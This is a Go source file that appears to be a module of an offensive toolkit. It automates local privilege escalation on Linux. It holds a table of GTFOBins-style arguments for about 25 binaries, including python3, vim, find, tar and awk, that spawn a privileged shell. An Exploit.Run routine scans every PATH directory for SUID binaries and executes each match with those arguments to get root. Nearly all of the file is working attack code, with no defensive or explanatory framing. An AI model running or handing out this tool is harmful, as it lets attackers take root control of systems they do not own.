package SUID

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
)

var gtfobins = map[string][]string{
	"python3": {"-c", "import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")"},
	"vim":     {"-c", ":py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")"},
	"find":    {".", "-exec", "/bin/sh", "-p", ";", "-quit"},
	"awk":     {"BEGIN {system(\"/bin/sh\")}"},
	"bash":    {"-p"},
	"cp":      {"--preserve=mode", "/bin/sh", "/tmp/cp_root_sh"},
	"less":    {"/etc/passwd", "!/bin/sh"},
	"more":    {"/etc/passwd", "!/bin/sh"},
	"nano":    {"-s", "/bin/sh"},
	"ed":      {"!sh"},
	"env":     {"/bin/sh"},
	"expect":  {"-c", "spawn /bin/sh; interact"},
	"ftp":     {"-s", "/tmp/ftp_script"},
	"gdb":     {"-nx", "-ex", "!sh", "-ex", "quit"},
	"git":     {"-p", "help", "--", "!sh"},
	"lua":     {"-e", "os.execute('/bin/sh')"},
	"perl":    {"-e", "exec '/bin/sh';"},
	"php":     {"-r", "system('/bin/sh');"},
	"ruby":    {"-e", "exec '/bin/sh'"},
	"scp":     {"-S", "/tmp/scp_script", "x", "y"},
	"tar":     {"--checkpoint=1", "--checkpoint-action=exec=/bin/sh", "-cf", "/dev/null", "/dev/null"},
	"timeout": {"7d", "/bin/sh"},
	"rsync":   {"-e", "sh -p", "127.0.0.1:/dev/null"},
	"zsh":     {"-p"},
	"chmod":   {},
}

type Exploit struct{}

func (e *Exploit) Run() {
	pathEnv := os.Getenv("PATH")
	paths := strings.Split(pathEnv, ":")

	for _, dir := range paths {
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue // 忽略不可读目录
		}

		for _, entry := range entries {
			if entry.IsDir() {
				continue
			}

			fullPath := filepath.Join(dir, entry.Name())

			info, err := os.Stat(fullPath)
			if err != nil {
				continue
			}

			stat, ok := info.Sys().(*syscall.Stat_t)
			if !ok {
				continue
			}

			// 检查 SUID 位
			if stat.Mode&04000 == 0 {
				continue
			}

			bin := entry.Name()
			cmdArgs, ok := gtfobins[bin]
			if !ok {
				continue
			}

			fmt.Printf("find SUID: %s\n", fullPath)
			fmt.Printf("try get root: %s %v\n", fullPath, cmdArgs)

			cmd := exec.Command(fullPath, cmdArgs...)
			cmd.Stdin = os.Stdin
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
			err = cmd.Run()
			if err != nil {
				fmt.Printf("fail get root: %v\n", err)
			}
		}
	}
}
